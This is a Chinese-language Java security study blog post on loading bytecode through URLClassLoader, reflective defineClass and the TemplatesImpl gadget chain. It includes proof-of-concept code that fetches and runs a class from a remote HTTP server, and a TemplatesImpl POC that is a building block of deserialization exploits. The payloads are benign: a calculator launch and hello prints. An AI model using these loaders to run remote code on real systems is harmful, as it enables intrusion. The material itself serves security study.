# [Java安全] Templatesimpl与字节码


# Java字节码

![image-20221003145149412](https://tuchuang.huamang.xyz/img/image-20221003145149412.png)

# URLClassLoader远程加载

在前面学习classloader的时候就学习到了URLClassLoader，进行远程加载类

比如我在远程服务器写一个这个类

```java
public class Test {
    public static void main(String[] args){
        try{
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } 
        catch(Exception e) {
            e.printStackTrace();
        }
    }

}
```

然后在服务端远程加载这个类

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLClassLoaderTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        URL url = new URL("http://101.35.98.118:12424/javatest/");
        URLClassLoader cl = new URLClassLoader(new URL[]{url});
        Class c = cl.loadClass("Test");
        c.newInstance();
    }
}
```

>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：
>
> URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件
>
>URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件
>
>URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 
>
>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。



# defineClass直接加载

加载字节码，无论是远程还是本地，最后都会到defineClass，p牛这里画了一个图非常直观

![image-20221003150244511](https://tuchuang.huamang.xyz/img/image-20221003150244511.png)

- loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass 

- findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass 

- defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类

他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中

但是要注意的是，defineClass调用的时候，**类对象不会被初始化**，所以如果要使用defineClass来加载类的时候，需要想办法**调用构造方法**

这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用**反射**的形式来调用

```java
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class defineClass {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
        Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),"Hello",code,0,code.length);
        hello.newInstance();

    }
}


```

![image-20221003154444756](https://tuchuang.huamang.xyz/img/image-20221003154444756.png)



# TemlatesImpl加载字节码

defineClass因为太底层了，一般开发是不会直接使用他的，但是不代表就没有价值了，比如这个TemlatesImpl里面就用到了defineClass，下面来分析这个利用链

在TemplatesImpl里定义了一个TransletClassLoader，这里面最后一行重写了defineClass方法，而且没有声明定义域，那就是默认default，可以在当前类和同包里被利用

![image-20221003161442834](https://tuchuang.huamang.xyz/img/image-20221003161442834.png)

那我们就找TemplatesImpl哪里调用了`TransletClassLoader#defineClass()`，找引用，发现在`TemplatesImpl#defineTransletClasses()`调用了，但是这个作用域是private，所以我们再找一下哪里调用了这个

![image-20221003162153066](https://tuchuang.huamang.xyz/img/image-20221003162153066.png)

继续找引用，找到个getTransletInstance，还是private

![image-20221003162540336](https://tuchuang.huamang.xyz/img/image-20221003162540336.png)

继续找引用，在newTransformer找到唯一的应用，而且newTransFormer是public，可以在外面被调用了

![image-20221003162637511](https://tuchuang.huamang.xyz/img/image-20221003162637511.png)

所以链子就出来了

```java
TemplatesImpl#newTransformer() ->
TemplatesImpl#getTransletInstance() -> 
TemplatesImpl#defineTransletClasses()-> 
TransletClassLoader#defineClass()
```

现在我们来构造POC，看看如何把序列化数据放进去执行defineClass，从后往前看，code作为唯一的传输传入

![image-20221003164319235](https://tuchuang.huamang.xyz/img/image-20221003164319235.png)

往上走，首先是TransletClassLoader对象的创建，这里的第二个参数需要我们传入不然会报错，只需要创建一个对象传进去就行了

```java
private transient TransformerFactoryImpl _tfactory = null;
```

![image-20221003172520085](https://tuchuang.huamang.xyz/img/image-20221003172520085.png)

这里循环传入，数据来源是`_bytecodes[i]`，他是私有成员变量，可以控制

![image-20221003164600033](https://tuchuang.huamang.xyz/img/image-20221003164600033.png)

但是仅有`_bytecode`是不行的，这里我们往上走会发现，这里要进去这个方法还有条件，我们必须保证`_name`不为空，否则就不会进入defineTransletClasses

![image-20221003165638514](https://tuchuang.huamang.xyz/img/image-20221003165638514.png)

所以我们需要为TemplatesImpl设定三个值，由于是私有属性，我们需要用到反射`setAccessible`去设置私有成员变量

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;

public class TemplatesImplTest {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM");
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{bytes});
        setFieldValue(templates,"_name","test");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        templates.newTransformer();
    }

    //利用反射给私有变量赋值如下
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
}

```

但是我们拿刚刚defineClass的序列化数据直接跑起来发现，他没有执行命令

原因是TemplatesImpl对加载的字节码是有要求的：这个字节码对应的类必须是 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的子类

所以我们需要构造一个继承了`AbstractTranslet`的类，在他的构造方法里去写我们要执行的代码

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TempClass extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public TempClass(){
        super();
        System.out.println("Hello TemplatesImpl");
    }
}

```

![image-20221003173827012](https://tuchuang.huamang.xyz/img/image-20221003173827012.png)


